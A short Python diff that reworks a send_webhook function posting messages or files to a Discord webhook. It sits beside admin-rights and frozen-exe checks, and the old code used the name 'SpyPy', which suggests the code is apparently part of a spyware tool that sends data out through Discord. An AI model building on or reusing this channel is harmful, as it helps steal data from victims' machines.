@@ -8,14 +8,15 @@ def is_admin():
     return ctypes.windll.shell32.IsUserAnAdmin()
 
 
-def send_webhook(url, message=None, file=None):
-    data = {"username": "SpyPy"}
-    if message:
-        data["content"] = message
+# send embeds to discord webhook
+def send_webhook(url, content=None, file=None):
+    if not url:
+        print("ERROR: ATTEMPTED TO SEND WEBHOOK WITHOUT URL")
+        return
     if file:
-        data["file"] = file
-    requests.post(url, json=data)
-
+        requests.post(url, files=file)
+    else:
+        requests.post(url, json={"content": content})
 
 def is_exe():
     return getattr(sys, "frozen", False)
